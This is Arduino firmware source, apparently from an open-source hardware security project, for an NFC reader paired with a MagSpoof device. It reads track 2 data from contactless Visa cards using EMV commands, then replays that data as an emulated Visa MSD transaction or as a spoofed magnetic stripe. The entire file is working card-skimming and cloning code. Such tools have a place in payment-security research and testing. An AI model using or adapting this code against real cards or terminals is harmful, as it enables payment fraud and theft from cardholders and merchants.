/**
 * Example to extract track 2 from a NFC transaction and emulate a Visa MSD transaction or 
 * spoof magnetic data with MagSpoof 
 * 
 * Authors: 
 *        Salvador Mendoza - @Netxing - salmg.net
 *        For Electronic Cats - electroniccats.com
 * 
 *  April 2020
 * 
 * This code is beerware; if you see me (or any other collaborator 
 * member) at the local, and you've found our code helpful, 
 * please buy us a round!
 * Distributed as-is; no warranty is given.
 */

/* Important:
 "token" variable is used for NFC.
 "tokenString" variable is used for MagSpoof after a NFC track 2 extraction.

  - If "token" variable is "empty", the NFC button will activate the "reading" feature 
 to try to obtain the track 2 from a NFC card and display its content over USB. Also, if 
 the track 2 is detected in the NFC reading, it will be saved in both "token" and "tokenString" 
 variables to be used for emulating a NFC transaction or as magstripe data for MagSpoof without 
 reprogramming. This new behavior will be notorious by LEDs.
 
 Basically, "token" and "tokenString" are used to store a sniffed track 2 from a NFC reading. 

 Futhermore, it is possible to initialize this variables with valid data. 
 If so, the NFC button will activate the "emulation" mode using the data in the "token" 
 variable instead of reading the card.

 Example to initialized this variable with card data to emulate NFC transaction instead of reading if need it:
 
 char token[19] = {0x44,0x12,0x34,0x15,0x01,0x12,0x03,0x12,0xd2,0x41,0x12,0x01,0x10,0x12,0x09,0x99,0x99,0x99,0x1f};

 The C-APDU command length can be up to 261 bytes (CLA-INS-P1-P2-P3-255 data bytes-Le) and 
 the R-APDU returned to the host controller can have a length of 258 bytes (256 data bytes-SW1-SW2).
*/

#include <Wire.h>
#include <SPI.h>
#include <Adafruit_PN532.h>

#define PN532_SCK  (17)
#define PN532_MOSI (16)
#define PN532_SS   (18)
#define PN532_MISO (19)

#define L1         (14) //LED1 indicates activity
#define L2         (5)  //LED2 indicates that track 2 is saved in "token" variable for NFC emulation purposes
#define L3         (4)  //LED3 indicates that track 2 is saved in "tokenString variable for MagSpoof purposes

#define PIN_A      (6)  //MagSpoof pin output
#define PIN_B      (7)  //MagSpoof pin output

#define MPIN       (28) //MagsSpoof Button
#define NPIN       (27) //NFC Button

#define NFCT       (3)  //How many times to emulate the card

#define CLOCK_US   (500)

#define BETWEEN_ZERO (53) // 53 zeros between track1 & 2

#define TRACKS (2)
#define DEBUGCAT

Adafruit_PN532 nfc(PN532_SCK, PN532_MISO, PN532_MOSI, PN532_SS);

// consts get stored in flash as we don't adjust them
const char* tracks[] = {
  "%B123456781234567^LASTNAME/FIRST^YYMMSSSDDDDDDDDDDDDDDDDDDDDDDDDD?\0", // Track 1
  ";123456781234567=112220100000000000000?\0" // Track 2
};

char token[19];
String tokenString = "";

uint8_t ppdol [255] = {0x80, 0xA8, 0x00, 0x00, 0x02, 0x83, 0x00};

char revTrack[41];
const int sublen[] = {
  32, 48, 48 
};
const int bitlen[] = {
  7, 5, 5 
};
unsigned int curTrack = 0;
int dir;

void setup(){
  pinMode(PIN_A, OUTPUT);
  pinMode(PIN_B, OUTPUT);
  pinMode(L1, OUTPUT);
  pinMode(L2, OUTPUT);
  pinMode(L3, OUTPUT);
  pinMode(MPIN, INPUT_PULLUP);
  pinMode(NPIN, INPUT_PULLUP);

  Serial.begin(115200);
  //while(!Serial){}
  Serial.println("Hello!");

  nfc.begin();

  uint32_t versiondata = nfc.getFirmwareVersion();
  if (! versiondata) {
    Serial.print("Didn't find PN53x board");
    //while (1); // halt
  }

  // blink to show we started up
  blink(L1, 200, 2);
  blink(L2, 200, 2);
  blink(L3, 200, 2);
  
  // Got ok data, print it out!
  Serial.print("Found chip PN5"); Serial.println((versiondata>>24) & 0xFF, HEX); 
  Serial.print("Firmware ver. "); Serial.print((versiondata>>16) & 0xFF, DEC); 
  Serial.print('.'); Serial.println((versiondata>>8) & 0xFF, DEC);
  
  nfc.setPassiveActivationRetries(0xFF);
  
  // configure board to read RFID tags
  nfc.SAMConfig();
  
  // store reverse track 2 to play later
  storeRevTrack(2);
}

void blink(int pin, int msdelay, int times){
  for (int i = 0; i < times; i++){
    digitalWrite(pin, HIGH);
    delay(msdelay);
    digitalWrite(pin, LOW);
    delay(msdelay);
  }
}

// send a single bit out
void playBit(int sendBit){
  dir ^= 1;
  digitalWrite(PIN_A, dir);
  digitalWrite(PIN_B, !dir);
  delayMicroseconds(CLOCK_US);

  if (sendBit){
    dir ^= 1;
    digitalWrite(PIN_A, dir);
    digitalWrite(PIN_B, !dir);
  }
  delayMicroseconds(CLOCK_US);

}

// when reversing
void reverseTrack(int track){
  int i = 0;
  track--; // index 0
  dir = 0;

  while (revTrack[i++] != '\0');
  i--;
  while (i--)
    for (int j = bitlen[track]-1; j >= 0; j--)
      playBit((revTrack[i] >> j) & 1);
}

// plays out a full track, calculating CRCs and LRC
void playTrack(int track){
  int tmp, crc, lrc = 0;
  dir = 0;
  track--; // index 0
  // enable H-bridge and LED
  //digitalWrite(ENABLE_PIN, HIGH);

  // First put out a bunch of leading zeros.
  for (int i = 0; i < 25; i++)
    playBit(0);

  //(!token[0]) ? tracks[track][i] != '\0' : i <= 19
  //for (int i = 0; tracks[track][i] != '\0'; i++)
  for (int i = 0; (tokenString.length()) ? i < tokenString.length() : tracks[track][i] != '\0'; i++)
  {
    crc = 1;
    //tmp = tracks[track][i] - sublen[track];
    tmp = (tokenString.length()) ? tokenString[i] : tracks[track][i];
    tmp -= sublen[track];
    
    for (int j = 0; j < bitlen[track]-1; j++)
    {
      crc ^= tmp & 1;
      lrc ^= (tmp & 1) << j;
      playBit(tmp & 1);
      tmp >>= 1;
    }
    playBit(crc);
  }

  // finish calculating and send last "byte" (LRC)
  tmp = lrc;
  crc = 1;
  for (int j = 0; j < bitlen[track]-1; j++)
  {
    crc ^= tmp & 1;
    playBit(tmp & 1);
    tmp >>= 1;
  }
  playBit(crc);

  // if track 1, play 2nd track in reverse (like swiping back?)
  if (track == 0)
  {
    // if track 1, also play track 2 in reverse
    // zeros in between
    for (int i = 0; i < BETWEEN_ZERO; i++)
      playBit(0);

    // send second track in reverse
    reverseTrack(2);
  }

  // finish with 0's
  for (int i = 0; i < 5 * 5; i++)
    playBit(0);

  digitalWrite(PIN_A, LOW);
  digitalWrite(PIN_B, LOW);
  //digitalWrite(ENABLE_PIN, LOW);

}

// stores track for reverse usage later
void storeRevTrack(int track){
  int i, tmp, crc, lrc = 0;
  track--; // index 0
  dir = 0;

  for (i = 0; tracks[track][i] != '\0'; i++)
  {
    crc = 1;
    tmp = tracks[track][i] - sublen[track];

    for (int j = 0; j < bitlen[track]-1; j++)
    {
      crc ^= tmp & 1;
      lrc ^= (tmp & 1) << j;
      tmp & 1 ?
        (revTrack[i] |= 1 << j) :
        (revTrack[i] &= ~(1 << j));
      tmp >>= 1;
    }
    crc ?
      (revTrack[i] |= 1 << 4) :
      (revTrack[i] &= ~(1 << 4));
  }

  // finish calculating and send last "byte" (LRC)
  tmp = lrc;
  crc = 1;
  for (int j = 0; j < bitlen[track]-1; j++)
  {
    crc ^= tmp & 1;
    tmp & 1 ?
      (revTrack[i] |= 1 << j) :
      (revTrack[i] &= ~(1 << j));
    tmp >>= 1;
  }
  crc ?
    (revTrack[i] |= 1 << 4) :
    (revTrack[i] &= ~(1 << 4));

  i++;
  revTrack[i] = '\0';
}


void printData(uint8_t* buff, uint8_t lenbuffer, uint8_t cmd){
  char tmp[1];
  if (cmd == 1)
    Serial.print("\nNFC Copy Cat Command: ");
  else if (cmd == 2)
    Serial.print("\nReader command: ");
  else if(cmd == 3)
    Serial.print("\nNFC Copy Cat answer: ");
  else
    Serial.print("\nCard answer: ");
        
  for (uint8_t u = 0; u < lenbuffer; u++) {
    sprintf(tmp, "0x%.2X",buff[u]);
    Serial.print(tmp); Serial.print(" ");
  }
}

void runTarget(){ //Target emulation mode using a pre-saved token
  bool success;
  uint8_t apdubuffer[255]= {}, apdulen;
  uint8_t ppsea[] = {0x8E,0x6F,0x23,0x84,0x0E,0x32,0x50,0x41,0x59,0x2E,0x53,0x59,0x53,0x2E,0x44,0x44,0x46,0x30,0x31,0xA5,0x11,0xBF,0x0C,0x0E,0x61,0x0C,0x4F,0x07,0xA0,0x00,0x00,0x00,0x03,0x10,0x10,0x87,0x01,0x01,0x90,0x00};
  uint8_t visaa[] = {0x8E,0x6F,0x1E,0x84,0x07,0xA0,0x00,0x00,0x00,0x03,0x10,0x10,0xA5,0x13,0x50,0x0B,0x56,0x49,0x53,0x41,0x20,0x43,0x52,0x45,0x44,0x49,0x54,0x9F,0x38,0x03,0x9F,0x66,0x02,0x90,0x00};
  uint8_t processinga[] = {0x8E,0x80,0x06,0x00,0x80,0x08,0x01,0x01,0x00,0x90,0x00};
  uint8_t last [5] =  {0x8E,0x70,0x15,0x57,0x13};
  uint8_t card[26]={};
  
  uint8_t statusapdu[2] = {0x90,0x00};
  uint8_t finished[] = {0x8E,0x6f,0x00};
  
  memcpy(&card[0], last, sizeof(last));
  memcpy(&card[5], token, sizeof(token));
  memcpy(&card[24], statusapdu, sizeof(statusapdu));
  
  uint8_t *apdus[] = {ppsea, visaa, processinga, card, finished, finished}; 
  uint8_t apdusLen [] = {sizeof(ppsea), sizeof(visaa), sizeof(processinga), sizeof(card), sizeof(finished), sizeof(finished)};
  
  nfc.AsTarget();
  success = nfc.getDataTarget(apdubuffer, &apdulen);
  if (apdulen){
    printData(apdubuffer, apdulen, 2);
    for (uint8_t i = 0; i < 6; i++){
      nfc.setDataTarget(apdus[i], apdusLen[i]);
      printData(apdubuffer, apdulen, 3);
      nfc.getDataTarget(apdubuffer, &apdulen);
      printData(apdubuffer, apdulen, 2);
    }
    Serial.println("Emulated!");
  }
  else
    Serial.println("Error: could not find NFC reader");
  delay(1000);  
}
/* treatPDOL function:
* Make a right format challenge using the card PDOL to extract more data(track 2)
* Note: This challenge only follows the format, do not use it as real challenge generator
*/
uint8_t treatPDOL(uint8_t* apdu){ 
  uint8_t plen = 7;
  Serial.println("");
  //PDOL Format: 80 A8 00 00 + (Tamaño del PDOL+2) + 83 + Tamaño del PDOL + PDOL + 00
  for (uint8_t i = 1; i <= apdu[0]; i++){
    if (apdu[i] == 0x9F && apdu[i+1] == 0x66){
      ppdol[plen] = 0xF6;
      ppdol[plen+1] = 0x20;
      ppdol[plen+2] = 0xC0;
      ppdol[plen+3] = 0x00;
      plen += 4;
      i += 2;
    }
   else if(apdu[i] == 0x9F && apdu[i+1] == 0x1A){
      ppdol[plen] = 0x9F;
      ppdol[plen+1] = 0x1A;
      plen += 2;
      i += 2;
    }     
    else if(apdu[i] == 0x5F && apdu[i+1] == 0x2A){
      ppdol[plen] = 0x5F;
      ppdol[plen+1] = 0x2A;
      plen += 2;
      i += 2;
    }
    else if(apdu[i] == 0x9A){
      ppdol[plen] = 0x9A;
      ppdol[plen+1] = 0x9A;
      ppdol[plen+2] = 0x9A;
      plen += 3;
      i += 1;
    }
    else if(apdu[i] == 0x95){
      ppdol[plen] = 0x95;
      ppdol[plen+1] = 0x95;
      ppdol[plen+2] = 0x95;
      ppdol[plen+3] = 0x95;
      ppdol[plen+4] = 0x95;
      plen += 5;
      i += 1;
    }
    else if(apdu[i] == 0x9C){
      ppdol[plen] = 0x9C;
      plen += 1;
      i += 1;
    }
    else if(apdu[i] == 0x9F && apdu[i+1] == 0x37){
      ppdol[plen] = 0x9F;
      ppdol[plen+1] = 0x37;
      ppdol[plen+2] = 0x9F;
      ppdol[plen+3] = 0x37;
      plen += 4;
      i += 2;
    }
    else{
      uint8_t u = apdu[i+2];
      while (u > 0){
        ppdol[plen] = 0;
        plen += 1;
        u--;
      }
      i += 2;
    }
  }
  ppdol[4] = (plen + 2) - 7; // Length of PDOL + 2
  ppdol[6] = plen - 7;       // Real length
  plen++;                    // +1 because the last 0
  ppdol[plen] = 0x00;        // Add the last 0 to the challenge
  return plen;
}

void seekTrack2(){ //Find Track 2 in the NFC reading transaction
  bool exc, chktoken = false, existpdol = false;
  uint8_t apdubuffer[255]= {}, apdulen;
  
  uint8_t ppse[] = {0x00, 0xA4, 0x04, 0x00, 0x0e, 0x32, 0x50, 0x41, 0x59, 0x2e, 0x53, 0x59, 0x53, 0x2e, 0x44, 0x44, 0x46, 0x30, 0x31, 0x00}; //20
  uint8_t visa[] = {0x00, 0xA4, 0x04, 0x00, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0x00}; //13
  uint8_t processing [] = {0x80, 0xA8, 0x00, 0x00, 0x02, 0x83, 0x00, 0x00}; //8
  uint8_t sfi[] = {0x00, 0xb2, 0x01, 0x0c, 0x00}; //5
  
  uint8_t *apdus[] = {ppse, visa, processing, sfi}; 
  uint8_t apdusLen [] = { sizeof(ppse), sizeof(visa), sizeof(processing), sizeof(sfi)};
  
  uint8_t pdol[50], plen = 8;

  for (uint8_t i = 0; i < 4; i++){
    blink(L2, 150, 1);
    if (nfc.inDataExchange(apdus[i], apdusLen[i], &apdubuffer[0], &apdulen)) {
      printData(apdus[i], apdusLen[i], 1);
      printData(apdubuffer, apdulen, 4);
      
      for (uint8_t u = 0; u < apdulen; u++) {
        if (i == 1){
          if (apdubuffer[u] == 0x9F && apdubuffer[u+1] == 0x38){
            for (uint8_t e = 0; e <= apdubuffer[u+2]; e++)
              pdol[e] =  apdubuffer[u+e+2];
            
            plen = treatPDOL(pdol);
            apdus[2] = ppdol;
            apdusLen[2] = plen;       
            existpdol = true;
          }
        }
        else if (i == 3){
          if (apdubuffer[u] == 0x57 && apdubuffer[u+1] == 0x13 && !chktoken){
            chktoken = true;
            memcpy(&token, &apdubuffer[u+2], 19);
            break;
          }
        }
      }
      if (i == 1){
        char tmp[1];
        Serial.print("\nFull challenge: ");
        for (uint8_t b = 0; b < plen; b++){
          sprintf(tmp, "0x%.2X",existpdol ? ppdol[b] : processing[b]);
          Serial.print(tmp);Serial.print(" ");
        }
        Serial.println("");
      }
      Serial.println("");
    }
    else
      Serial.println("Error reading the card!");
  }
  if (chktoken)
    formatToken();
  else
    Serial.print("Could not find the track 2!");
}

void formatToken(){ // Make special format from NFC track 2 to MagSpoof track 2
  uint8_t i2 = 0;
  for (int i = 0; i <= sizeof(token)*2; i++) {
    switch(i){
      case 0:
        tokenString = String(';');
        break;
      case 17:
        tokenString += String('=');
        break;
      case 38:
        tokenString += String('?');
        break;
      default:
        if (i % 2)
          tokenString += String(token[i2]/0x10);
        else{
          tokenString += String(token[i2]%0x10);
          i2 += 1;
        }
        break;
    }
  }
  if (tokenString.length() > 0){
    Serial.print("Obtained and formatted token: ");
    Serial.println(tokenString);
    digitalWrite(L2, HIGH);
    digitalWrite(L3, HIGH);
  }
}

bool nfcread(){ // Wait and try to read a Visa NFC card
  bool success;
  success = nfc.inListPassiveTarget();
  if (success)
    seekTrack2();
  return success;
}

void magbutton(){ // Run MagSpoof using tracks from code or from NFC reading
  if (digitalRead(MPIN) == 0){
    blink(L3, 150, 1);
    Serial.println("Activating MagSpoof...");
    if(tokenString.length() > 0){
      Serial.println("Using MagStripe data from memory");
      playTrack(2);
    }
    else
      playTrack(1 + (curTrack++ % 2));
      
    blink(L1, 150, 3);
    delay(400);
  }
}

void nfcbutton(){ // Activate NFC reading or emulate card from a previous reading
  if (digitalRead(NPIN) == 0){
    blink(L2, 150, 1);
    Serial.println("Activating NFC...");
    if(token[0] != 0x0){
      Serial.println("Using data from memory to emulate a transaction...");
      
      uint8_t timesNFC = 0;
      while(timesNFC < NFCT){
        blink(L2, 150, 1);
        runTarget();
        blink(L2, 150, 1);
        delay(2000);
        timesNFC += 1;
      }
    }
    else {
      if (!nfcread())
        Serial.println("Error: Could not find a NFC card...");
    }
    
    blink(L1, 100, 3);
    delay(400);
  }
}

void chkdata(){ // Use LEDs to indicate if we have data in "token" or "tokenString" for emulation or MagSpoof
  if(tokenString.length())
    digitalWrite(L3, HIGH);
  else
    digitalWrite(L3, LOW);
    
  if(token[0])
    digitalWrite(L2, HIGH);
  else
    digitalWrite(L2, LOW);
}

void loop(){ // Main loop
  chkdata();
  magbutton();
  nfcbutton();
}
